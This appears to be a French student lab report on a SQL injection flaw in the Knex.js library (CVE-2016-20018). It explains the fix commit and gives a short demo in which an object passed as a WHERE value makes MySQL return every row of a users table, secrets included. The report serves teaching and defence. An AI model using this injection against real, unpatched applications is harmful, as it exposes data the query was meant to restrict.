# TP-CVE
# William - M2I M2 IASI

## 1 - Trouvez une CVE sortie en 2022 (score ≥ 7) 🔎
## CVE-2016-20018
Le package Knex.JS présente une vulnérabilité limité d’injection SQL pouvant être exploitée pour ignorer la clause WHERE d’une requête SQL.
Cette vulnérabilité fonctionne seulement sur des bases de données MySQL et a été corrigée dans la version 2.4.0. Elle affecte des milliers de packages NodeJS utilisant Knex pour construire des requêtes SQL qui n'excluent pas les paramètres ayant pour type Object et Array.

https://github.com/advisories/GHSA-4jv9-3563-23j3

![](https://i.imgur.com/KlWHWpf.png)

## 2 - Trouvez sur github (ou ailleurs) le fix (commit) de la CVE et expliquez ce fix 🔨

https://github.com/knex/knex/pull/5417

```
whereBasic(statement) {
     assert(
       !isPlainObjectOrArray(statement.value),
       'The values in where clause must not be object or array.'
     );

     return super.whereBasic(statement);
   }

   whereRaw(statement) {
     assert(
       isEmpty(statement.value.bindings) ||
         !Object.values(statement.value.bindings).some(isPlainObjectOrArray),
       'The values in where clause must not be object or array.'
     );

     return super.whereRaw(statement);
   }
```

Le fix bloque tous les paramètres insérés dans la clause `WHERE` d’une requête qui sont de type `Array` ou `Object`, en utilisant les packages [loadash](https://www.npmjs.com/package/lodash) et [assert](https://www.npmjs.com/package/assert), permettant ainsi d’éviter une injection dans les paramètres.

## 3 – Proposez une démo d’exploitation de la CVE  🖥️
Prenons une table `users` ayant pour colonnes: `id`, `name` et `secret` avec deux utilisateurs: "admin" et "guest".

| id | name  | secret             |
| -- |-------|--------------------|
| 1  | admin | super confidentiel |
| 2  | guest | salut              |

```
knex('users')
    .select()
    .where({ secret: { "name": "admin" } })
    .then(res => console.log(res))
```
En exécutant le code ci-dessus, Knex va générer la requête SQL suivante: ```select * from `users` where `secret` = `name` = 'admin'```.

Avec cette syntaxe, MySQL va ignorer la clause `WHERE` et exécuter la requête suivante: ```select * from `users` ``` et donc retourner toutes les lignes de la table `users`:

```
[
  RowDataPacket { id: 1, name: 'admin', secret: 'super confidentiel' },
  RowDataPacket { id: 2, name: 'guest', secret: 'salut' }
]
```

Le code utilisé pour générer la base de données et reproduire la CVE se trouve dans le fichier [index.js](./index.js).

![](https://i.imgur.com/3q3wxrb.png)
